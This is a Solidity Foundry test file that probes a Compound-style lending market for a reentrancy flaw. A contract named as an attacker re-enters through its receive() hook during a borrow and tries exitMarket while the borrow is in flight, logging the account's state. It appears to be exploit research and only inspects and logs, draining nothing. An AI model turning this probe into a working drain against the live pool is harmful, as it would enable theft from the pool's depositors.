// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface IComptroller {
    function enterMarkets(address[] calldata cTokens) external returns (uint256[] memory);
    function exitMarket(address cToken) external returns (uint256);
    function getAccountLiquidity(address account) external view returns (uint256, uint256, uint256);
    function accountAssets(address, uint256) external view returns (address);
    function getAssetsIn(address) external view returns (address[] memory);
}

interface ICEther {
    function mint() external payable;
    function borrow(uint256 borrowAmount) external returns (uint256);
    function getCash() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function borrowBalanceStored(address) external view returns (uint256);
    function redeem(uint256 redeemTokens) external returns (uint256);
    function repayBorrow() external payable;
    function getAccountSnapshot(address) external view returns (uint256, uint256, uint256, uint256);
}

contract Pool72Test9 is Test {
    IComptroller constant COMPTROLLER = IComptroller(0xDcc615Ba569e60c7eD31B74686624fC1770bdD9A);
    ICEther constant FETH72 = ICEther(0x8Ea8Fcd938D45D2461e023b96044Acab4780F07b);

    // Test: exitMarket works normally (outside reentrancy)
    function testExitMarketNormal() public {
        address payable user = payable(address(0xBEEF));
        vm.deal(user, 100 ether);

        vm.startPrank(user);

        // Mint and enter market
        FETH72.mint{value: 10 ether}();
        address[] memory markets = new address[](1);
        markets[0] = address(FETH72);
        COMPTROLLER.enterMarkets(markets);

        // Check assets
        address[] memory assets = COMPTROLLER.getAssetsIn(user);
        console.log("Assets in (before exit):", assets.length);

        // Exit market (no borrow, should work)
        uint256 exitResult = COMPTROLLER.exitMarket(address(FETH72));
        console.log("Exit result:", exitResult);

        assets = COMPTROLLER.getAssetsIn(user);
        console.log("Assets in (after exit):", assets.length);

        // Redeem
        uint256 redeemResult = FETH72.redeem(FETH72.balanceOf(user));
        console.log("Redeem result:", redeemResult);

        vm.stopPrank();
    }

    // Test: exitMarket after borrow (should fail with NONZERO_BORROW_BALANCE)
    function testExitMarketAfterBorrow() public {
        address payable user = payable(address(0xBEEF));
        vm.deal(user, 200 ether);

        vm.startPrank(user);

        FETH72.mint{value: 150 ether}();
        address[] memory markets = new address[](1);
        markets[0] = address(FETH72);
        COMPTROLLER.enterMarkets(markets);

        // Borrow
        uint256 borrowResult = FETH72.borrow(1 ether);
        console.log("Borrow result:", borrowResult);

        // Try exit (should fail)
        uint256 exitResult = COMPTROLLER.exitMarket(address(FETH72));
        console.log("Exit result after borrow:", exitResult);

        // Repay borrow
        FETH72.repayBorrow{value: 1 ether}();
        console.log("Borrow after repay:", FETH72.borrowBalanceStored(user));

        // Try exit again (should succeed)
        exitResult = COMPTROLLER.exitMarket(address(FETH72));
        console.log("Exit result after repay:", exitResult);

        // Redeem
        uint256 redeemResult = FETH72.redeem(FETH72.balanceOf(user));
        console.log("Redeem result:", redeemResult);

        vm.stopPrank();
    }

    // Test: getAccountSnapshot during reentrancy - replicate what exitMarket does
    function testReentrancyDebug() public {
        address payable user = payable(address(0xBEEF));
        vm.deal(user, 200 ether);

        vm.startPrank(user);
        DebugReentrancyContract d = new DebugReentrancyContract(user);
        d.attack{value: 150 ether}();
        vm.stopPrank();
    }
}

contract DebugReentrancyContract {
    IComptroller constant COMPTROLLER = IComptroller(0xDcc615Ba569e60c7eD31B74686624fC1770bdD9A);
    ICEther constant FETH72 = ICEther(0x8Ea8Fcd938D45D2461e023b96044Acab4780F07b);

    address payable immutable owner;
    bool borrowInFlight;
    bool reentered;

    constructor(address payable _owner) {
        owner = _owner;
    }

    function attack() external payable {
        FETH72.mint{value: msg.value}();

        address[] memory markets = new address[](1);
        markets[0] = address(FETH72);
        COMPTROLLER.enterMarkets(markets);

        borrowInFlight = true;
        uint256 result = FETH72.borrow(1 ether);
        borrowInFlight = false;
        console.log("Borrow result:", result);
        console.log("Reentered:", reentered);

        // Repay and redeem
        FETH72.repayBorrow{value: 1 ether}();
        FETH72.redeem(FETH72.balanceOf(address(this)));
        (bool ok,) = owner.call{value: address(this).balance}("");
        require(ok);
    }

    receive() external payable {
        if (!borrowInFlight || reentered) return;
        reentered = true;

        console.log("=== REENTRANCY DEBUG ===");

        // 1. Check getAccountSnapshot
        (uint256 err, uint256 tokensHeld, uint256 amountOwed, uint256 er) = FETH72.getAccountSnapshot(address(this));
        console.log("Snapshot err:", err);
        console.log("Snapshot tokensHeld:", tokensHeld);
        console.log("Snapshot amountOwed:", amountOwed);
        console.log("Snapshot exchangeRate:", er);

        // 2. Check assets in
        address[] memory assets = COMPTROLLER.getAssetsIn(address(this));
        console.log("Assets count:", assets.length);
        for (uint256 i = 0; i < assets.length; i++) {
            console.log("Asset:", assets[i]);
        }

        // 3. Check liquidity
        (uint256 lErr, uint256 liq, uint256 shortfall) = COMPTROLLER.getAccountLiquidity(address(this));
        console.log("Liquidity err:", lErr);
        console.log("Liquidity:", liq);
        console.log("Shortfall:", shortfall);

        // 4. Try exitMarket but catch revert
        try COMPTROLLER.exitMarket(address(FETH72)) returns (uint256 exitCode) {
            console.log("exitMarket SUCCEEDED:", exitCode);
        } catch (bytes memory reason) {
            console.log("exitMarket REVERTED, reason length:", reason.length);
        }
    }
}
